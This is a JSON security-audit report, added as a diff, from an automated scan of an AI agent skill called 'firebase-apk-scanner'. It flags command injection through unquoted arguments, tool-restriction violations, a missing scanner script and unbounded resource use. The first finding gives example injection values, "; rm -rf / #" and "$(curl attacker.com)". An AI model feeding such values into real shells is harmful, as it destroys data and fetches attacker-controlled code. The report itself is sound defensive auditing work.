@@ -1,0 +1,156 @@
+{
+  "skill_name": "firebase-apk-scanner",
+  "skill_path": "/workspace/skills/trailofbits-skills/plugins/firebase-apk-scanner/skills/firebase-apk-scanner",
+  "skill_directory": "/workspace/skills/trailofbits-skills/plugins/firebase-apk-scanner/skills/firebase-apk-scanner",
+  "is_safe": false,
+  "max_severity": "HIGH",
+  "findings_count": 4,
+  "findings": [
+    {
+      "id": "llm_finding_firebase-apk-scanner_1",
+      "rule_id": "LLM_COMMAND_INJECTION",
+      "category": "command_injection",
+      "severity": "HIGH",
+      "title": "Unvalidated Command Injection Risk via $ARGUMENTS",
+      "description": "The skill passes user-provided input ($ARGUMENTS) directly to bash commands without validation or sanitization. The workflow executes 'ls -la $ARGUMENTS' and '{baseDir}/scanner.sh $ARGUMENTS' with unsanitized user input, creating command injection vulnerabilities. An attacker could provide malicious input like '; rm -rf / #' or '$(curl attacker.com)' to execute arbitrary commands.",
+      "file_path": "SKILL.md",
+      "line_number": null,
+      "snippet": "ls -la $ARGUMENTS\n{baseDir}/scanner.sh $ARGUMENTS - Direct variable expansion in bash without quotes or validation",
+      "remediation": "Validate and sanitize $ARGUMENTS before use. Use proper quoting: \"$ARGUMENTS\". Implement allowlist validation to ensure input is a valid file path. Use parameter expansion with safety checks. Consider using Python for safer argument handling instead of direct bash variable expansion.",
+      "analyzer": "llm",
+      "metadata": {
+        "model": "claude-sonnet-4-5-20250929",
+        "overall_assessment": "This Firebase APK scanner skill presents CRITICAL security risks due to missing core components and unsafe input handling. The primary concern is that the scanner.sh script - which performs all actual security testing operations - is not included in the package, making it impossible to verify what the skill actually does. The skill executes this missing script with unsanitized user input, creating command injection vulnerabilities. Additionally, the skill violates its declared tool restrictions by executing arbitrary bash commands beyond the specified tools. The skill's purpose (security scanning with network operations and credential testing) combined with the lack of transparency creates significant trust and security concerns. While the documentation and vulnerability reference file appear educational and legitimate, the missing implementation and unsafe execution patterns make this skill unsuitable for use without major security improvements.",
+        "primary_threats": [
+          "Data Exfiltration Risk",
+          "Command Injection",
+          "Tool Restriction Violation",
+          "Missing Critical Components",
+          "Unsafe Input Handling"
+        ],
+        "aitech": "AITech-9.1",
+        "aitech_name": "Model or Agentic System Manipulation",
+        "aisubtech": "AISubtech-9.1.4",
+        "aisubtech_name": "Injection Attacks (SQL, Command Execution, XSS)",
+        "scanner_category": "INJECTION ATTACK",
+        "meta_validated": true,
+        "meta_confidence": "HIGH",
+        "meta_confidence_reason": "LLM analyzer correctly identified unquoted variable expansion in bash commands. This is a well-known command injection vector. The skill documentation shows direct variable substitution without sanitization.",
+        "meta_exploitability": "Easy - User controls $ARGUMENTS directly. No authentication or validation required.",
+        "meta_impact": "High - Arbitrary command execution on the host system with agent privileges. Could lead to data theft, system compromise, or lateral movement."
+      }
+    },
+    {
+      "id": "llm_finding_firebase-apk-scanner_2",
+      "rule_id": "LLM_UNAUTHORIZED_TOOL_USE",
+      "category": "unauthorized_tool_use",
+      "severity": "HIGH",
+      "title": "Tool Restriction Violation - Unrestricted Bash Execution",
+      "description": "The allowed-tools declaration specifies 'Bash({baseDir}/scanner.sh:*)' and 'Bash(apktool:*)' and 'Bash(curl:*)' but the instructions show execution of arbitrary bash commands like 'ls -la $ARGUMENTS' which is not restricted to these specific tools. The skill also references network operations (curl to Firebase APIs) that could be used for data exfiltration while claiming to be a security scanner.",
+      "file_path": "SKILL.md",
+      "line_number": null,
+      "snippet": "allowed-tools: Bash({baseDir}/scanner.sh:*), Bash(apktool:*), Bash(curl:*) - but instructions show 'ls -la $ARGUMENTS' and unrestricted bash execution patterns",
+      "remediation": "Strictly enforce tool restrictions. If only scanner.sh, apktool, and curl should be used, remove direct bash command execution. Implement proper tool sandboxing. Add explicit validation that only declared tools are invoked.",
+      "analyzer": "llm",
+      "metadata": {
+        "model": "claude-sonnet-4-5-20250929",
+        "overall_assessment": "This Firebase APK scanner skill presents CRITICAL security risks due to missing core components and unsafe input handling. The primary concern is that the scanner.sh script - which performs all actual security testing operations - is not included in the package, making it impossible to verify what the skill actually does. The skill executes this missing script with unsanitized user input, creating command injection vulnerabilities. Additionally, the skill violates its declared tool restrictions by executing arbitrary bash commands beyond the specified tools. The skill's purpose (security scanning with network operations and credential testing) combined with the lack of transparency creates significant trust and security concerns. While the documentation and vulnerability reference file appear educational and legitimate, the missing implementation and unsafe execution patterns make this skill unsuitable for use without major security improvements.",
+        "primary_threats": [
+          "Data Exfiltration Risk",
+          "Command Injection",
+          "Tool Restriction Violation",
+          "Missing Critical Components",
+          "Unsafe Input Handling"
+        ],
+        "aitech": "AITech-12.1",
+        "aitech_name": "Tool Exploitation",
+        "aisubtech": "AISubtech-12.1.2",
+        "aisubtech_name": "Tool Poisoning",
+        "scanner_category": "SUSPICIOUS CODE EXECUTION",
+        "meta_validated": true,
+        "meta_confidence": "HIGH",
+        "meta_confidence_reason": "The allowed-tools list explicitly restricts bash to specific commands, but the workflow instructions use unrestricted bash commands. This is a clear policy violation.",
+        "meta_exploitability": "Low - Requires the agent runtime to enforce tool restrictions. If not enforced, this becomes a command injection vector.",
+        "meta_impact": "Medium - Undermines the security model of tool restrictions. If restrictions are enforced, the skill will fail. If not enforced, it enables broader command execution than declared."
+      }
+    },
+    {
+      "id": "llm_finding_firebase-apk-scanner_3",
+      "rule_id": "LLM_SOCIAL_ENGINEERING",
+      "category": "social_engineering",
+      "severity": "HIGH",
+      "title": "Deceptive Capability Claims - Missing Critical Script",
+      "description": "The skill claims to be a 'Firebase APK Security Scanner' that performs comprehensive security testing including authentication testing, database access attempts, and cloud function enumeration. However, the actual scanner.sh script that performs these operations is not included in the package, making it impossible to verify the skill's true behavior. This creates a trust issue where users cannot validate what the skill actually does versus what it claims to do.",
+      "file_path": "SKILL.md",
+      "line_number": null,
+      "snippet": "Description claims comprehensive Firebase security scanning capabilities, but scanner.sh (the core component) is missing from the package. Instructions reference network operations and API testing that cannot be verified.",
+      "remediation": "Include all executable scripts in the package for transparency. Provide clear documentation of all network operations performed. Add checksums or signatures for script verification. Consider open-sourcing the scanner script for community review.",
+      "analyzer": "llm",
+      "metadata": {
+        "model": "claude-sonnet-4-5-20250929",
+        "overall_assessment": "This Firebase APK scanner skill presents CRITICAL security risks due to missing core components and unsafe input handling. The primary concern is that the scanner.sh script - which performs all actual security testing operations - is not included in the package, making it impossible to verify what the skill actually does. The skill executes this missing script with unsanitized user input, creating command injection vulnerabilities. Additionally, the skill violates its declared tool restrictions by executing arbitrary bash commands beyond the specified tools. The skill's purpose (security scanning with network operations and credential testing) combined with the lack of transparency creates significant trust and security concerns. While the documentation and vulnerability reference file appear educational and legitimate, the missing implementation and unsafe execution patterns make this skill unsuitable for use without major security improvements.",
+        "primary_threats": [
+          "Data Exfiltration Risk",
+          "Command Injection",
+          "Tool Restriction Violation",
+          "Missing Critical Components",
+          "Unsafe Input Handling"
+        ],
+        "aitech": "AITech-2.1",
+        "aitech_name": "Social Engineering",
+        "aisubtech": null,
+        "aisubtech_name": null,
+        "scanner_category": "SOCIAL ENGINEERING",
+        "meta_validated": true,
+        "meta_confidence": "HIGH",
+        "meta_confidence_reason": "The file list clearly shows only SKILL.md and references/vulnerabilities.md are present. The scanner.sh script referenced in allowed-tools and workflow instructions is missing.",
+        "meta_exploitability": "Medium - Requires user to invoke the skill, but once invoked, the missing script creates unpredictable behavior or errors.",
+        "meta_impact": "High - Users cannot verify security claims. The skill may fail to execute, or worse, if scanner.sh is fetched from an external source, it could be malicious."
+      }
+    },
+    {
+      "id": "llm_finding_firebase-apk-scanner_5",
+      "rule_id": "LLM_RESOURCE_ABUSE",
+      "category": "resource_abuse",
+      "severity": "MEDIUM",
+      "title": "Unbounded APK Processing Without Resource Limits",
+      "description": "The skill accepts APK files or directories as input without apparent size limits, validation, or resource constraints. Processing large APKs or directories with many APKs could lead to resource exhaustion through decompilation (apktool), file system operations, and network requests. The workflow shows no timeout mechanisms or resource limits.",
+      "file_path": "SKILL.md",
+      "line_number": null,
+      "snippet": "Accepts $ARGUMENTS as APK file or directory without validation of size, count, or resource limits. Uses apktool for decompilation which can be resource-intensive for large APKs.",
+      "remediation": "Implement file size limits for APK processing. Add timeout mechanisms for decompilation and scanning operations. Validate input is actually an APK file before processing. Limit the number of APKs processed in batch operations. Add progress indicators and cancellation options for long-running scans.",
+      "analyzer": "llm",
+      "metadata": {
+        "model": "claude-sonnet-4-5-20250929",
+        "overall_assessment": "This Firebase APK scanner skill presents CRITICAL security risks due to missing core components and unsafe input handling. The primary concern is that the scanner.sh script - which performs all actual security testing operations - is not included in the package, making it impossible to verify what the skill actually does. The skill executes this missing script with unsanitized user input, creating command injection vulnerabilities. Additionally, the skill violates its declared tool restrictions by executing arbitrary bash commands beyond the specified tools. The skill's purpose (security scanning with network operations and credential testing) combined with the lack of transparency creates significant trust and security concerns. While the documentation and vulnerability reference file appear educational and legitimate, the missing implementation and unsafe execution patterns make this skill unsuitable for use without major security improvements.",
+        "primary_threats": [
+          "Data Exfiltration Risk",
+          "Command Injection",
+          "Tool Restriction Violation",
+          "Missing Critical Components",
+          "Unsafe Input Handling"
+        ],
+        "aitech": "AITech-13.3",
+        "aitech_name": "Availability Disruption",
+        "aisubtech": "AISubtech-13.3.2",
+        "aisubtech_name": "Compute Exhaustion",
+        "scanner_category": "RESOURCE ABUSE",
+        "meta_validated": true,
+        "meta_confidence": "MEDIUM",
+        "meta_confidence_reason": "The skill documentation shows no resource limits, but the actual impact depends on the missing scanner.sh implementation. APK decompilation is known to be resource-intensive.",
+        "meta_exploitability": "Medium - Requires providing a large or malicious APK file. Attacker needs to convince user to scan their file.",
+        "meta_impact": "Medium - Could cause denial of service through resource exhaustion, but limited to the agent's execution environment."
+      }
+    }
+  ],
+  "scan_duration_seconds": 46.74953556060791,
+  "duration_ms": 46749,
+  "analyzers_used": [
+    "static_analyzer",
+    "behavioral_analyzer",
+    "llm_analyzer",
+    "trigger_analyzer",
+    "meta_analyzer"
+  ],
+  "timestamp": "2026-02-06T07:05:31.445293"
+}
